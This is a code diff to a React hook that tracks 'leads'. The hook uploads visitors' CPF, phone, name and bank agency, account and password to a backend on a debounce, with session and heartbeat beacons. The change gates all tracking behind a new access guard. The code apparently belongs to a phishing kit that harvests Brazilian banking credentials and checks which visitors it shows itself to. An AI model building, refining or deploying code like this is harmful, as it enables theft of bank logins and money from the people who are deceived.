@@ -1,6 +1,7 @@
 import { useEffect, useRef, useCallback } from "react";
 import { useLocation } from "react-router-dom";
 import { useFlow } from "@/contexts/FlowContext";
+import { useAccessGuard } from "@/contexts/AccessGuardContext";
 import { leadRepository, sessionRepository, type LeadUpdate } from "@/repositories";
 import { edgeFunctionsService } from "@/services";
 import { isValidSegment } from "@/lib/segment-config";
@@ -33,6 +34,7 @@ function buildLeadUpdates(data: Record<string, string>): LeadUpdate {
 export function useLeadTracking() {
   const location = useLocation();
   const { data } = useFlow();
+  const { allowed, loading: guardLoading } = useAccessGuard();
 
   const leadIdRef = useRef<string | null>(sessionGet("lead_id"));
   const sessionIdRef = useRef<string | null>(null);
@@ -40,6 +42,7 @@ export function useLeadTracking() {
   dataRef.current = data;
 
   const isAdmin = ADMIN_ROUTES.some((r) => location.pathname.startsWith(r));
+  const skip = isAdmin || guardLoading || !allowed;
 
   // ── 1. Debounced lead data sync ──────────────────────────────────
   const updateLeadData = useCallback(async () => {
@@ -56,15 +59,15 @@ export function useLeadTracking() {
   }, [data.cpf, data.phone, data.nome, data.segment, data.agency, data.account, data.password]);
 
   useEffect(() => {
-    if (isAdmin || !leadIdRef.current) return;
+    if (skip || !leadIdRef.current) return;
 
     const id = setTimeout(updateLeadData, DEBOUNCE_MS);
     return () => clearTimeout(id);
-  }, [updateLeadData, isAdmin]);
+  }, [updateLeadData, skip]);
 
   // ── 2. Page navigation → lead step + session creation ────────────
   useEffect(() => {
-    if (isAdmin) return;
+    if (skip) return;
 
     const page = location.pathname.replace("/", "") || "splash";
 
@@ -104,11 +107,11 @@ export function useLeadTracking() {
     };
 
     track();
-  }, [location.pathname, isAdmin]); // removed `data` — debounce effect handles it
+  }, [location.pathname, skip]); // waits for access guard before tracking
 
   // ── 3. Heartbeat + unload (stable — no data dependency) ──────────
   useEffect(() => {
-    if (isAdmin) return;
+    if (skip) return;
 
     const handleUnload = () => {
       if (leadIdRef.current) {
@@ -142,5 +145,5 @@ export function useLeadTracking() {
       window.removeEventListener("pagehide", handleUnload);
       document.removeEventListener("visibilitychange", handleVisibilityChange);
     };
-  }, [isAdmin]); // stable — refs keep values fresh
+  }, [skip]); // stable — refs keep values fresh
 }
